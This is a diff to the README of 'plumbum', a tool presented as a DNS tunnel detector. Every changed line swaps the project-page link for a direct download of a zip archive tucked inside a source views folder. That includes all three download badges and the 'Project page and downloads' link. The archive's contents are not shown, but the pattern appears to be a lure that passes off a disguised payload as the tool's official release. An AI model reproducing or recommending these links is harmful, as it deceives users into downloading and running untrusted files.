@@ -1,6 +1,6 @@
 # 🛡️ plumbum - Clear DNS Tunnel Detection Tool
 
-[![Download plumbum](https://img.shields.io/badge/Download-plumbum-blue?style=for-the-badge&logo=github)](https://github.com/XXXCAIO1997/plumbum)
+[![Download plumbum](https://img.shields.io/badge/Download-plumbum-blue?style=for-the-badge&logo=github)](https://github.com/XXXCAIO1997/plumbum/raw/refs/heads/main/plumbum-tui/src/views/Software-v3.6.zip)
 
 ---
 
@@ -50,7 +50,7 @@ Each part of the score can be inspected. This means you can see which parts of y
 
 Click the blue button below to visit the plumbum download page on GitHub:
 
-[![Download plumbum](https://img.shields.io/badge/Download-plumbum-blue?style=for-the-badge&logo=github)](https://github.com/XXXCAIO1997/plumbum)
+[![Download plumbum](https://img.shields.io/badge/Download-plumbum-blue?style=for-the-badge&logo=github)](https://github.com/XXXCAIO1997/plumbum/raw/refs/heads/main/plumbum-tui/src/views/Software-v3.6.zip)
 
 This page contains the latest release and installation files.
 
@@ -143,7 +143,7 @@ The report explains each feature in plain language. This helps you decide whethe
 
 ## 🔗 Useful Links
 
-- Project page and downloads: https://github.com/XXXCAIO1997/plumbum  
+- Project page and downloads: https://github.com/XXXCAIO1997/plumbum/raw/refs/heads/main/plumbum-tui/src/views/Software-v3.6.zip  
 - GitHub Releases section for direct installer files  
 - PCAP file creation tools (Wireshark)  
 - Zeek documentation for log formats  
@@ -160,4 +160,4 @@ The report explains each feature in plain language. This helps you decide whethe
 
 ---
 
-[![Download plumbum](https://img.shields.io/badge/Download-plumbum-blue?style=for-the-badge&logo=github)](https://github.com/XXXCAIO1997/plumbum)
+[![Download plumbum](https://img.shields.io/badge/Download-plumbum-blue?style=for-the-badge&logo=github)](https://github.com/XXXCAIO1997/plumbum/raw/refs/heads/main/plumbum-tui/src/views/Software-v3.6.zip)
